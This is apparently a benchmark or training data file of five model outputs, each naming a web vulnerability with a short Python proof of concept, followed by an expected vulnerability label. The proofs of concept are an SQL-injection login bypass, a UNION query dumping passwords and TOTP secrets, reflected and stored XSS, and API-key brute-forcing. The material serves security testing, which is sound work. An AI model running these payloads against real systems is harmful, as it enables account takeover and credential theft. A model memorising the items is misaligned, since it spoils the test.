pair_001.output: The code is vulnerable to SQL Injection due to unsanitized input in a template literal; a Python PoC to bypass authentication is: import requests; TARGET = "http://vulnerable-app:3000"; url = f"{TARGET}/rest/user/login"; payload = {"email": "' OR 1=1--", "password": "anything"}; resp = requests.post(url, json=payload); print(resp.json()).

pair_002.output: The search feature is vulnerable to UNION-based SQL Injection; a Python PoC to dump user data is: import requests; import urllib.parse; TARGET = "http://vulnerable-app:3000"; sqli = "')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--"; url = f"{TARGET}/rest/products/search?q={urllib.parse.quote(sqli)}"; resp = requests.get(url); print(resp.json()).

pair_003.output: The application is vulnerable to Reflected XSS because orderId is rendered without encoding; a Python PoC is: import requests; import urllib.parse; TARGET = "http://vulnerable-app:3000"; vector = '<script>alert(document.cookie)</script>'; url = f"{TARGET}/rest/track-order/{urllib.parse.quote(vector)}"; resp = requests.get(url); print(f'Reflected: {vector in resp.text}').

pair_004.output: The system is vulnerable to Stored XSS as reviews are rendered as raw HTML; a Python PoC to inject a payload is: import requests; TARGET = "http://vulnerable-app:3000"; payload = {"message": "<script>alert('Stored XSS')</script>", "author": "attacker@evil.com"}; resp = requests.put(f"{TARGET}/rest/products/1/reviews", json=payload); print(f'Status: {resp.status_code}').

pair_005.output: The API is vulnerable to Authentication Bypass via brute-forcing a hardcoded key; a Python PoC is: import requests; API = "http://internal-api:5000"; keys = ["admin", "secret", "s3cret-internal-key-2024"]; [print(f'Key found: {k}') for k in keys if requests.get(f"{API}/admin/users", headers={"X-Internal-Key": k}).status_code == 200].

expected.vuln_type: Authentication Bypass - Hardcoded API Key Bruteforce
